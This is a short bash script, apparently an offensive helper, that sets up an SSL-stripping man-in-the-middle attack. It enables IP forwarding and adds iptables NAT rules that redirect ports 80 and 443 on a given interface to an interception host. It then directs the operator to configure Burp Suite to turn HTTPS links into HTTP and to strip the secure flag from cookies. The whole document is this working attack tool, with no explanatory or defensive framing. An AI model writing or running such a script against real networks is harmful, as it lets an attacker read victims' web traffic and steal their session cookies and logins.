if [[ $2 == "" ]] ; then
     echo "./$0 SRVHOST INTERFACE"
     exit
fi
echo 1 > /proc/sys/net/ipv4/ip_forward
echo '[+] Echo 1 > /proc/sys/net/ipv4/ip_forward'
iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --in-interface $2 --to-destination $1
echo '[+] Iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --in-interface'" $2"' --to-destination'" $1"
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --in-interface $2 --to-destination $1
echo '[+] Iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --in-interface'" $2 "'--to-destination'" $1"
echo '[-] Now open Burpsuite > Proxy > Options'
echo '[-] Add proxy Listeners on ports 443,80 .. enable ( Support Invisible Proxying )'
echo '[-] And in Response Modification Enable ( Convert HTTPS links to HTTP )'
echo '[-] And ( Remove secure Flag from cookies )'
echo ""
echo "Hit Enter to Exit" ; read key
iptables --flush
echo '[+] Iptables --flush'
echo 0 > /proc/sys/net/ipv4/ip_forward
echo '[+] Echo 0 > /proc/sys/net/ipv4/ip_forward'
echo '[X] EXIT'

